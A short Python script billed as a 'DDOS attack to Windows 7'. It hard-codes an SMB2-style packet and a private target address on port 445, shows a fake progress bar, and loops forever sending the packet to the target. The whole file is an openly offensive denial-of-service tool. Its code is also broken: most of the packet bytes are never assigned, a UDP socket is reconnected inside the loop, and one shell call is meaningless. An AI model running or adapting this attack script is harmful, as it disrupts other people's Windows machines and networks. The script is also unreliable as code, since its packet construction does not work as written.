import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data= "\x00\x00\x00\x9a\xfe\x53\x4d\x42\x40\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x00\x01"
"\x00\x02\x02\x00\x00\x30\x82\xa4\x11\xe3\x12\x23\x41\xaa\x4b"
"\xad\x99\xfd\x52\x31\x8d\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x01\x00\x00\x00\x01\x00\xcf\x73\x67\x74\x62\x60\xca\x01\xcb\x51"
"\xe0\x19\x62\x60\xca\x01\x80\x00\x1e\x00\x20\x4c\x4d\x20\x60\x1c"
"\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x12\x30\x10\xa0\x0e\x30\x0c"
"\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a".join(sys.argv[1:])
#############


os.system("clear")
os.system("DDos Attack")
print
print ("DDOS attack to Windows 7")
print
ip = ("192.168.169.110")
port = int("445")


os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.connect((ip, port))
    print("Connected to the target")
    sock.sendall(bytes(data + "\n", "utf-8"))
    print("Lauching DDos to target:", ip, " port :", port)
    print("Sent:     {}".format(data))
    # Receive data from the server and shut down
    received = str(sock.recv(1024), ("utf-8"))
    print("Received: {}".format(received))
    # sock.sendto(packet, (ip,port))
    # sent = sent + 1
    # port = port + 1
    # print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    # if port == 65534:
    #   port = 1

